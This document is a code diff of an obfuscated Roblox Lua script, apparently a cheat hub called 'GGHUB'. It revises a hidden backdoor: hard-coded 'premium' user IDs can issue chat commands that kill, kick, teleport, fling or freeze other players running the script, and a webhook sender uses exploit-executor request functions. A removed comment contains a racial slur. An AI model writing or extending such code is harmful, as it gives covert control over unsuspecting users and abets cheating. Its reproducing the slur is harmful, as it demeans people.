@@ -5,7 +5,6 @@ local function L_1_func()
     local L_5_ = game:GetService("TeleportService")
     local L_6_ = game:GetService("RunService")
     
-    -- fuck you nigass bypass this sh idgaf lmao
     local function sendWebhook(content)
         pcall(function()
             if syn and syn.request then
@@ -31,10 +30,10 @@ local function L_1_func()
     end
     
     local premiumUsers = {
-        [232083112] = true,
-        [9323471719] = true, -- Gold bu ark
+        [232083112] = true, -- farx
+        [9323471719] = true, -- gold
         [533423728] = true, -- xian
-        [3683565610] = true -- Jayden
+        [3683565610] = true -- jayden
     }
     
     local function L_8_func()
@@ -73,6 +72,7 @@ local function L_1_func()
     
     local L_16_ = {}
     local L_17_ = 0
+    local commandConnections = {}
     
     local function L_18_func(L_19_arg1)
         return premiumUsers[L_19_arg1] == true
@@ -98,12 +98,17 @@ local function L_1_func()
         wait(1)
         if L_18_func(L_23_arg1.UserId) then
             L_16_[L_23_arg1.UserId] = L_23_arg1
+            L_25_func(L_23_arg1)
         end
     end)
     
     L_3_.PlayerRemoving:Connect(function(L_24_arg1)
         if L_16_[L_24_arg1.UserId] then
             L_16_[L_24_arg1.UserId] = nil
+        end
+        if commandConnections[L_24_arg1.UserId] then
+            commandConnections[L_24_arg1.UserId]:Disconnect()
+            commandConnections[L_24_arg1.UserId] = nil
         end
     end)
     
@@ -112,20 +117,26 @@ local function L_1_func()
     local function L_25_func(L_26_arg1)
         if not L_26_arg1 or not L_18_func(L_26_arg1.UserId) then return end
         
-        local L_27_
-        L_27_ = L_26_arg1.Chatted:Connect(function(L_28_arg1)
+        if commandConnections[L_26_arg1.UserId] then
+            commandConnections[L_26_arg1.UserId]:Disconnect()
+        end
+        
+        commandConnections[L_26_arg1.UserId] = L_26_arg1.Chatted:Connect(function(L_28_arg1)
             if not L_18_func(L_26_arg1.UserId) then
-                L_27_:Disconnect()
+                if commandConnections[L_26_arg1.UserId] then
+                    commandConnections[L_26_arg1.UserId]:Disconnect()
+                    commandConnections[L_26_arg1.UserId] = nil
+                end
                 return
             end
             
-            local L_29_ = L_28_arg1:lower()
+            local L_29_ = string.lower(string.gsub(L_28_arg1, "^%s*", ""))
             
             if L_29_ == "/e bring" then
                 pcall(function()
                     for L_30_forvar0, L_31_forvar1 in pairs(L_3_:GetPlayers()) do
                         if L_31_forvar1 ~= L_26_arg1 and L_31_forvar1.Character and L_31_forvar1.Character:FindFirstChild("HumanoidRootPart") and L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
-                            L_31_forvar1.Character.HumanoidRootPart.CFrame = L_26_arg1.Character.HumanoidRootPart.CFrame
+                            L_31_forvar1.Character.HumanoidRootPart.CFrame = L_26_arg1.Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
                         end
                     end
                 end)
@@ -134,7 +145,7 @@ local function L_1_func()
                 pcall(function()
                     for L_32_forvar0, L_33_forvar1 in pairs(L_3_:GetPlayers()) do
                         if L_33_forvar1 ~= L_26_arg1 and L_33_forvar1.Character and L_33_forvar1.Character:FindFirstChild("Humanoid") then
-                            L_33_forvar1.Character.Humanoid.Health = 0
+                            L_33_forvar1.Character.Humanoid:TakeDamage(L_33_forvar1.Character.Humanoid.MaxHealth)
                         end
                     end
                 end)
@@ -150,15 +161,16 @@ local function L_1_func()
                 
             elseif L_29_ == "/e say" then
                 pcall(function()
-                    if L_3_.LocalPlayer.Character and L_3_.LocalPlayer.Character:FindFirstChild("Head") then
-                        game:GetService("Chat"):Chat(L_3_.LocalPlayer.Character.Head, "Hello! GGHUB", Enum.ChatColor.White)
+                    local currentPlayer = L_3_.LocalPlayer
+                    if currentPlayer.Character and currentPlayer.Character:FindFirstChild("Head") then
+                        game:GetService("Chat"):Chat(currentPlayer.Character.Head, "Hello! GGHUB", Enum.ChatColor.White)
                     end
                 end)
                 
             elseif L_29_ == "/e kick" then
                 pcall(function()
                     for L_36_forvar0, L_37_forvar1 in pairs(L_3_:GetPlayers()) do
-                        if L_37_forvar1 ~= L_26_arg1 then
+                        if L_37_forvar1 ~= L_26_arg1 and not L_18_func(L_37_forvar1.UserId) then
                             L_37_forvar1:Kick("Premium GGHUB, sorry")
                         end
                     end
@@ -195,11 +207,12 @@ local function L_1_func()
                 
             elseif L_29_ == "/e fling" then
                 pcall(function()
-                    if L_3_.LocalPlayer ~= L_26_arg1 and L_3_.LocalPlayer.Character and L_3_.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    local currentPlayer = L_3_.LocalPlayer
+                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("HumanoidRootPart") then
                         local L_43_ = Instance.new("BodyVelocity")
                         L_43_.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                         L_43_.Velocity = Vector3.new(math.random(-100,100), 100, math.random(-100,100))
-                        L_43_.Parent = L_3_.LocalPlayer.Character.HumanoidRootPart
+                        L_43_.Parent = currentPlayer.Character.HumanoidRootPart
                         
                         game:GetService("Debris"):AddItem(L_43_, 2)
                     end
@@ -207,22 +220,25 @@ local function L_1_func()
                 
             elseif L_29_ == "/e sit" then
                 pcall(function()
-                    if L_3_.LocalPlayer ~= L_26_arg1 and L_3_.LocalPlayer.Character and L_3_.LocalPlayer.Character:FindFirstChild("Humanoid") then
-                        L_3_.LocalPlayer.Character.Humanoid.Sit = true
+                    local currentPlayer = L_3_.LocalPlayer
+                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("Humanoid") then
+                        currentPlayer.Character.Humanoid.Sit = true
                     end
                 end)
                 
             elseif L_29_ == "/e slowwalk" then
                 pcall(function()
-                    if L_3_.LocalPlayer ~= L_26_arg1 and L_3_.LocalPlayer.Character and L_3_.LocalPlayer.Character:FindFirstChild("Humanoid") then
-                        L_3_.LocalPlayer.Character.Humanoid.WalkSpeed = 7
+                    local currentPlayer = L_3_.LocalPlayer
+                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("Humanoid") then
+                        currentPlayer.Character.Humanoid.WalkSpeed = 7
                     end
                 end)
                 
             elseif L_29_ == "/e angel" then
                 pcall(function()
-                    if L_3_.LocalPlayer ~= L_26_arg1 and L_3_.LocalPlayer.Character and L_3_.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and L_3_.LocalPlayer.Character:FindFirstChild("Humanoid") then
-                        local L_44_ = L_3_.LocalPlayer
+                    local currentPlayer = L_3_.LocalPlayer
+                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("HumanoidRootPart") and currentPlayer.Character:FindFirstChild("Humanoid") then
+                        local L_44_ = currentPlayer
                         local L_45_ = L_44_.Character
                         local L_46_ = L_45_.Humanoid
                         local L_47_ = L_45_.HumanoidRootPart
@@ -280,8 +296,9 @@ local function L_1_func()
                 
             elseif L_29_ == "/e orbit" then
                 pcall(function()
-                    if L_3_.LocalPlayer ~= L_26_arg1 and L_3_.LocalPlayer.Character and L_3_.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
-                        local L_55_ = L_3_.LocalPlayer
+                    local currentPlayer = L_3_.LocalPlayer
+                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("HumanoidRootPart") and L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
+                        local L_55_ = currentPlayer
                         local L_56_ = L_55_.Character
                         local L_57_ = L_56_.HumanoidRootPart
                         local L_58_ = L_56_.Humanoid
@@ -341,40 +358,22 @@ local function L_1_func()
                 end)
             end
         end)
-        
-        L_3_.PlayerRemoving:Connect(function(L_72_arg1)
-            if L_72_arg1 == L_26_arg1 then
-                L_27_:Disconnect()
-            end
-        end)
     end
     
     for L_73_forvar0, L_74_forvar1 in pairs(L_16_) do
         L_25_func(L_74_forvar1)
     end
     
-    L_3_.PlayerAdded:Connect(function(L_75_arg1)
-        wait(2)
-        if L_18_func(L_75_arg1.UserId) then
-            L_25_func(L_75_arg1)
-        end
-    end)
-    
     spawn(function()
         while true do
             wait(5)
             for L_76_forvar0, L_77_forvar1 in pairs(L_16_) do
-                if L_77_forvar1 and L_77_forvar1.Parent and not L_77_forvar1:FindFirstChild("_CommandsSetup") then
+                if L_77_forvar1 and L_77_forvar1.Parent and not commandConnections[L_77_forvar1.UserId] then
                     L_25_func(L_77_forvar1)
-                    local L_78_ = Instance.new("BoolValue")
-                    L_78_.Name = "_CommandsSetup"
-                    L_78_.Parent = L_77_forvar1
                 end
             end
         end
     end)
-    
-    print("if you have any issues about script join our discord server and report it please https://discord.gg/wMbrnEQ6MZ")
 end
 
 L_1_func()
